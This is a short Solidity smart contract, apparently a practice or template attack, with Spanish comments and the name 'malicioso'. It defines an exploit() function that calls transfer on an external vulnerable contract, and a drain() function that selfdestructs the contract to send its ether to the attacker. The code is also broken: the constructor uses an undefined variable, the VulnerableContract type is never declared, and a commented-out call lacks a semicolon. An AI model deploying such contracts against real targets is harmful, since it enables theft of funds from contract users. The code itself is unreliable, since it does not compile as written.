pragma solidity ^0.8.0;

contract malicioso{
    VulnerableContract private vulnerableContract;
    address public attacker;

    constructor(address _vulnerableContractAddress){
        vulnerableContract = VulnerableContract(__vulnerableContractAddress);
        attacker = msg.sender;
    }

    //Function que invoque el exploit
    function exploit() public payable{
        vulnerableContract.transfer(address(this), msg.value);
    }

 /*    function invocar() public {
        vulnerableContract.funcionVulnerable()
    }
 */
    receive() external payable {
        //podemos incluir acciones adicionales
        //eventos, activar banderas
    }

    function drain() public {
        require(msg.sender == attacker, "Solo el atacante puede drenar");
        selfdestruct(payable(attacker));
    }
}